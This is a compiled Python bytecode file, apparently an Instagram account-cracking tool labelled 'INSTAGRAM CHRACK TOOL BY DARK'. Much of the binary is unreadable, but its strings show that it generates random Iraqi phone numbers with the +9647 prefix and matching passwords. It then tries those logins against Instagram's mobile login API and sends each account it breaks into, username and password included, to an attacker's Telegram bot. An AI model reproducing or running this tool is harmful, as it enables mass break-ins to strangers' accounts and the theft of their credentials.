U
    ��a  �                   @   s�  d dl mZ d dlZd dlZd dlZd dlmZ d dlZd dlm	Z	 d dlZd dl
Z
d dlZd dlZd dlmZ d dl mZ d dlZd dlZd dl Z d Zd ZdZdZdZdZdZd	Zd
ZdZdZdZdZdZdZd	Zd
ZdZdZdZdZdZdZdZd	ZdZ dZdZdZd dl Z e �!� Z"e#e"� e#d� e�$d�Z%e#d� dd� Z&e&ee% � e&d� e
�'d� e#d� e#d� dd� Z(d dl Z e �!� Z"e#e"� e�$d�Z)e#d� dd� Z&e&ee) � e#d� e&ed � e&ed �Z*e&ed � ed� e#d� e+d e d! e d" e d# e d$ e �Z,e#d� e+d e d! e d" e d# e d% e �Z-e#d� e+d e d! e d" e d# e d& e �Z.e#d� e+d e d! e d" e d# e d' e �Z/e#d� e+d e d! e d" e d# e d( e �Z0e#d� e&d)� e#d� d dl Z e �1� Z2e �3d*e2�Z4e#d� ed+� e�5d,e,� d-e-� d.���� Z6e6d/ d0 Z7d1d2� Z8d3Z9d4d5d6d7d8d9d:d;d<d=�	Z:d>Z;e�<e;�j=Z>d?e>k�r�ed+� d@Z?e.dAk�r�e@d �AdBdC� eBdD�D ���ZCdEe/ eC ZDdFe0 eC ZEe@e� �ZFeFeEeDeFdGd6dFdH�ZGej5e9e:eGdI�ZHdJeH�� k�rBed7 ZeH�� dJ dK ZIe8eIeE� n�dLeH�� k�rje#edM eD dN eE � n\e�5d,e,� dOe-� dPe7� dQe� dReD� dSe� dTeE� dUe� dV�� e#edM eD dN eE � ed7 Z�q�dS )W�    )�sleepN)�generate_user_agent)�	token_hex)�uuid4z[1;31mz[1;32mz[1;33mz[2;31mz[2;32mz[2;39mz[2;35mz[2;36mz[1;34mz  z	HAMA GYANzCOD BY   DARKc                 C   s.   | D ]$}t j�|� t j��  t�d� qd S �Ng���Q��?��sys�stdout�write�flush�timer   ��z�e� r   �instagram.py�j7   s    
r   z=========================�clearz   c                 C   s,   | D ]"}t j�|� t j��  td� qd S )Ng{�G�zt?)r   r	   r
   r   r   r   r   r   r   �aA   s    
r   z DARK � c                 C   s.   | D ]$}t j�|� t j��  t�d� qd S r   r   r   r   r   r   r   K   s    
z==============================zS
<<<   [1]    Check in iRaQ KORK and ASIASEL   >>>
INSTAGRAM CHRACK   TOOL BY DARK
z====================�   � �(�!�)u      ⌯ TOKINE BOT TELEGRAM >>>:  u     ⌯ ID >> TELEGRAM >>>:  u     ⌯ bnwsa [1] >>> :  u     ⌯ Hlbzhera 50 yan 70 >>>:  u:     ⌯ pass agar 50 bw bnwsa 750 >>> agar 70 bw   770 >>:  z------------------------------z%H:%M:%S�   �https://api.telegram.org/bot�/sendMessage?chat_id=u'   &text=⌯ ⚡️ HAMA GOOD HAT 😊😋�resultZ
message_idc                 C   sn  t �d�d }ddddddd	d
dddd�}d| � d�}tj||d��� }t|d d d �}t|d d d �}t|d d d d �}t|d d d d �}	t|d d d �}
t|d d d �}t|d d d �}t�d|� ��}|�� }|d }d|� d| � d|� d|� d |� d!|	� d"|� d#|
� d$|� d%t� d&�}d't� d(t� d)|� �}t�	|�}t
t| � d S )*N�   r   zwww.instagram.com�TruezmMozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36�cookie�*/*z!application/x-www-form-urlencodedZXMLHttpRequestZ936619743392459�missingzen-US,en;q=0.9)ZHOSTZ	KeepAlivez
user-agent�Cookie�AcceptZContentTypezX-Requested-WithzX-IG-App-IDzX-Instagram-AJAXzX-CSRFToken�Accept-Languagezhttps://www.instagram.com/z/?__a=1)�headersZgraphql�userZ	full_name�idZedge_followed_by�countZedge_followZ
is_privateZ	biographyz$https://o7aa.pythonanywhere.com/?id=�dataug   

Hi,DARK⚡️ HI [HAMA]
  
  <<<HAMA GYAN GOOD HAT>>>
  ====================
 ⌯ 𝐧𝐚𝐦𝐞 : u   
⌯ 𝐮𝐬𝐞𝐫 : u   
⌯ 𝐩𝐚𝐬𝐬 : u   
⌯ 𝐢𝐝 : u.     
⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 : u,   
⌯ 𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 : u   
⌯ 𝐝𝐚𝐭𝐚 : u$   
⌯ 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 : u    
⌯ 𝐛𝐢𝐨 : u    
⌯ 𝐭𝐢𝐦𝐞 : z- 
 =================
DARK HACKER  HAMA GYAN
 r   r   z&text=)�secretsr   �requests�get�json�str�current_time�tok�ID�post�print�G)�userQ�passwordr!   �headZurl_idZreq_id�namer)   ZfollowesZ	followingZispZiddZbio�reZreeZdatZshugZtlg�ir   r   r   �	code_mrkol   sb    ����	�
������
r=   z.https://i.instagram.com/api/v1/accounts/login/zqInstagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)r"   r#   zgzip, deflatezen-USz3brTvw==ZWIFIz0application/x-www-form-urlencoded; charset=UTF-8zi.instagram.com)	z
User-Agentr%   r$   zAccept-Encodingr&   zX-IG-CapabilitieszX-IG-Connection-TypezContent-TypeZHostz!https://pastebin.com/raw/FwLVm5vCz[VPN]Z
1234567890�1c                 c   s   | ]}t �t�V  qd S )N)�randomZchoicer(   )�.0r<   r   r   r   �	<genexpr>�   s     rA   �   z+9647�0Zfalse)�uuidr8   �usernameZ	device_idZfrom_regZ
_csrftokenZlogin_attempt_countn)r'   r+   Zlogged_in_userrE   z*"message":"challenge_required","challenge"zuser : z
: passw : z/editmessagetext?chat_id=z&message_id=u5   &text=HI DARK HI HAMA DLM
==================
✅GOOD[u*   ]
================== 
⛔BAD 
⛔Email《 u     》=>  《u   》
⛔password《 u
    》=> 《u&   》
=====================
 BOD BY DARK)Jr   r   Z
webbrowserr?   r-   Z
user_agentr   r/   r,   r   �osr   rD   r   ZpyfigletZaaZzz�Er6   �S�Z�XZZ1�F�A�C�B�YZZ2ZE1ZG1ZS1ZG2�asctimeZtimeer5   Zfiglet_formatZhunterr   �systemr   Zhunter1Zask�inputr2   r3   ZshugerZerZoe�	localtime�t�strftimer1   r4   Z	start_msgZid_msgr=   Zurlr'   �wr.   �textZrssr(   r0   �join�range�usrE   r8   Zuidr+   Zreqr7   r   r   r   r   �<module>   s  


,,,,,3�


�<